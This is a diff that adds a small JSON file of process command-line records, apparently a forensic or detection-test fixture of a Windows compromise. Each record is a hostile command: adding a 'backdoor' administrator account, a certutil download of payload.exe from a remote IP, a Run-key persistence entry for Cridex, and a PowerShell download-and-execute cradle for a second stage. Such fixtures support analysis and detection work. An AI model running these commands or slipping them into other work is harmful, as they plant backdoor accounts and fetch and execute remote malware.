@@ -1,0 +1,7 @@
+[
+  {"PID": 1680, "Process": "cmd.exe", "Command": "net user backdoor Password123! /add"},
+  {"PID": 1680, "Process": "cmd.exe", "Command": "net localgroup administrators backdoor /add"},
+  {"PID": 1680, "Process": "cmd.exe", "Command": "certutil.exe -urlcache -f http://41.168.5.140/payload.exe C:\\Users\\Public\\payload.exe"},
+  {"PID": 1680, "Process": "cmd.exe", "Command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Cridex /d C:\\Users\\Public\\cridex.exe /f"},
+  {"PID": 1690, "Process": "powershell.exe", "Command": "IEX (New-Object Net.WebClient).DownloadString('http://125.19.103.198/stage2.ps1')"}
+]
